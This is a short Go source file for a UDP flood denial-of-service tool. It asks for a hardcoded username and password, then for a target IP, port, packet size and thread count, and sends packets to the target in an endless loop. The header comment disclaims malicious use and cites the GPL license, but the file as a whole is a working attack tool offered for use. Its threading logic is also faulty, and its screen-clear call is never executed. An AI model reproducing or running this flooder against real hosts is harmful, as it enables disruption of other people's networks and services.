package main

/*
Please do not be an asshole and use the script for malicious purposes as its not only very illegal but it also violates the gpl license of which this software is licensed under!
if you steal this code or make it proprietary. you are mega cringe
Consider changing the username and password variable in the source code located here
after changing the variables compile the program with "go build main.go"
*/
import (
	"fmt"
	"net"
	"os"
	"os/exec"

	"github.com/fatih/color"
)

var (
	user       string
	pass       string
	username   string = "root"     //change me
	password   string = "changeme" //change me
	host       string
	packetSize int
	port       int
	threads    int
	loginCheck int = 0
)

func main() {
	login()
	details()
	dos()

}
func login() {
	if loginCheck == 0 {
		fmt.Print("Username: ")
		fmt.Scanln(&user)
		if user != username {
			color.Red("Username is incorrect. logging out!")
			os.Exit(1)
		}
		color.HiGreen("Username correct")
		fmt.Print("Password: ")
		fmt.Scanln(&pass)
		if pass != password {
			color.Red("Password is incorrect. logging out!")
			os.Exit(1)
		}
		color.HiGreen("Password correct")
		loginCheck++
	}
}

func details() {
	fmt.Print("Enter IP address: ")
	fmt.Scanln(&host)
	if len(host) < 7 {
		color.Red("IP address is invalid! exiting program")
		os.Exit(1)
	}
	exec.Command("clear")
	color.Green("IP address is valid!")
	fmt.Print("Enter packet size -largest is 65500:  ")
	fmt.Scanln(&packetSize)
	fmt.Print("Enter Port for udp: ")
	fmt.Scanln(&port)
	fmt.Print("Enter thread count: ")
	fmt.Scanln(&threads)
}

func dos() {
	fullAddr := fmt.Sprintf("%s:%v", *&host, *&port)
	buff := make([]byte, *&packetSize)
	ping, err := net.Dial("udp", fullAddr)
	color.Magenta("Sending a udp flood to " + host + "....")
	if err != nil {
		color.Red("host is likely offline ", err)
	}

	for i := 0; i < threads; i++ {
		go main()
		for {
			ping.Write(buff)
		}
	}

}
